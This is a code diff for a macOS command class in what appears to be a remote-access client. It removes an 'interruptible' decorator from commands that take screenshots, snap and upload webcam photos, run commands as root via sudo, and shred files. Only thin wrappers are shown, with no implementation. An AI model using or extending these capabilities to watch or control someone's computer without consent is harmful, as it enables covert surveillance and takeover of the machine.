@@ -1,6 +1,5 @@
 from client.commands.arguments.decorators import argument_command
 from client.commands.common.commands import CommonCommands
-from client.commands.runtime.interrupts import interruptible
 from client.commands.platform.services.mac.automation_service import MacAutomationService
 from client.commands.platform.services.mac.file_inspection_service import MacFileInspectionService
 from client.commands.platform.services.mac.media_service import MacMediaService
@@ -22,12 +21,10 @@ class MacCommands(CommonCommands):
         self.mac_file_inspection = MacFileInspectionService(self)
 
     @desc("Capture a screenshot", group='platform')
-    @interruptible()
     def screenshot(self):
         return self.mac_media.capture_screenshot()
 
     @desc('Show system information', group='platform')
-    @interruptible()
     def getinfo(self, arg=''):
         try:
             return self.mac_system.collect_system_info(arg)
@@ -36,30 +33,25 @@ class MacCommands(CommonCommands):
             return 0, f'Failed to collect system information: {e}'
 
     @desc('Show user idle time', group='platform')
-    @interruptible()
     def idletime(self):
         return self.mac_system.get_idle_time()
 
     @desc('Capture webcam photo', group='platform')
-    @interruptible()
     def webcam_snap(self):
         """拍照并上传到服务器"""
         return self.mac_media.capture_webcam_photo()
 
     @desc('Launch new instance with sudo', group='platform')
-    @interruptible()
     def sudo_self(self):
         """以 root 权限启动新实例，返回 PID"""
         return self.mac_automation.sudo_self()
 
     @desc('Run command with sudo', group='platform')
-    @interruptible()
     def sudo_run(self, command):
         """以 root 权限执行命令 (macOS)"""
         return self.mac_automation.sudo_run(command)
 
     @desc('Securely delete file (overwrite)', group='file')
-    @interruptible()
     def file_shred(self, path):
         """安全删除文件（覆写后删除）"""
         return self.mac_file_inspection.secure_delete_file(path)
@@ -93,11 +85,9 @@ class MacCommands(CommonCommands):
         return self.mac_file_inspection.acmd_archive_peek(args_dict, payload)
 
     @argument_command('netstat', spec=NETSTAT_ARGUMENT_SPEC)
-    @interruptible()
     def _acmd_netstat(self, args_dict, payload=None):
         return self._acmd_netstat_common(args_dict, payload)
 
     @argument_command('ps', spec=PS_ARGUMENT_SPEC)
-    @interruptible()
     def _acmd_ps(self, args_dict, payload=None):
         return self._acmd_ps_common(args_dict, payload)
